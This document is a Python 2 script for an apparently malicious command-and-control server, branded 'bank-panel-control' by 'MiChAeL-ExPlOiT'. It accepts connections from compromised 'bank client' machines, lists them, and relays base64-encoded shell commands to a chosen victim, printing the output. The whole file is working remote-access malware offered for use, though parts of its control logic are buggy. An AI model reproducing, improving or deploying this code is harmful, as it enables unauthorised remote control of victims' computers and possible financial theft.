import  socket
import threading
import time
from Queue import Queue
import base64
import sys
import os
NUMBER_OF_THE = 3
JOBS = [1, 2, 3]
queue = Queue()
all_connctions = []
all_address = []

def Help():
    print "(1.type -h for this massege\n(2.type list for to see the clients(^_^)\n(3.type select + the id form the client"
    Sendcommands()

def manu():
    print ' _                 _                                _                       '
    print '| |__   __ _ _ __ | | __     _ __   __ _ _ __   ___| |       ___ ___  _ __   _             _ '
    print "| '_ \ / _` | '_ \| |/ /____| '_ \ / _` | '_ \ / _ \ |_____ / __/ _ \| '_ \ | |_ _ __ ___ | |"
    print "| |_) | (_| | | | |   <_____| |_) | (_| | | | |  __/ |_____| (_| (_) | | | || __| '__/ _ \| |"
    print '|_.__/ \__,_|_| |_|_|\_\    | .__/ \__,_|_| |_|\___|_|      \___\___/|_| |_|| |_| | | (_) | |'
    print '                            |_|                                              \__|_|  \___/|_|'
    print 'v1.0'
    print 'myde by: MiChAeL-ExPlOiT~>^_^'
    print '#############################'
    print 'type -h for help ^_^'


global s

def get_target(cmd):
    try:
        info = raw_input("insert the id:"'\t')
        target = cmd.replace('select', info)
        target = int(target)
        conn = all_connctions[target]
        print "Your now connect to a client of the bank " + str(all_address[target][0])
        print str(all_address[target][0] + '> ')
        return conn
    except:
        print "sorry no value"
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = raw_input("Bank-Client-Shell~>"'\t')
            if len(str(cmd)) > 0:
                conn.send((base64.b64encode(str(cmd))))
                client_response =  str(conn.recv(20480))
                decoder = base64.b64decode(client_response)
                print(decoder)


                s.close()

            else:
                Sendcommands()

        except:
            print ''


def list_connection():
    results = ''
    for i, conn in enumerate(all_connctions):
        try:
            conn.send(base64.b64encode('1'))
            conn.recv(1024)
        except:
            del all_connctions[i]
            del all_address[i]
        results += str(i) + '   ' + str(all_address[i][0] + '    ' + str(all_address[i][1]) + '\n')
    print ('---bank-clients---' '\n' 'id       ip      sec' + '\n' + results)


def Sendcommands():
    global conn
    while True:
        cmd = raw_input("bank-sheller~> ")
        if cmd == 'list':
            list_connection()
        elif cmd == 'select' in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
        elif cmd == '-h':
            Help()
        elif cmd == 'quit':
            exit()
        else:
            print "we sorry to tell you that but we do not have its command"


    else:
        print ("we dont have is command")


def SockOpen():
    while True:

        try:
            host = '127.0.0.1'
            port = 4434
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host, port))
            s.listen(20)

            for c in all_connctions:
                c.close()
            del all_connctions[:]
            del all_address[:]
            while 1:
                try:
                    conn, addr =  s.accept()
                    conn.setblocking(1)
                    all_connctions.append(conn)
                    all_address.append(addr)
                    print("\nuser loged in""\t" + addr[0])
                except socket.error as ErrorVictim:
                    print ('you can''t to connect' "\t" + str(ErrorVictim))

        except socket.error as Errormassege:
            print ('you cant to connect' "\t" + str(Errormassege))

def WWorks():
    for _ in range(NUMBER_OF_THE):
        Tt = threading.Thread(target=work)
        Tt.daemon = True
        Tt.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            manu()
        elif x == 2:
            time.sleep(0.9)
            Sendcommands()
        elif x == 3:
            SockOpen()
        else:
            print "we have a problem"
        queue.task_done()



def create_lobs():
    for x in JOBS:
        queue.put(x)
    queue.join()

WWorks()
create_lobs()
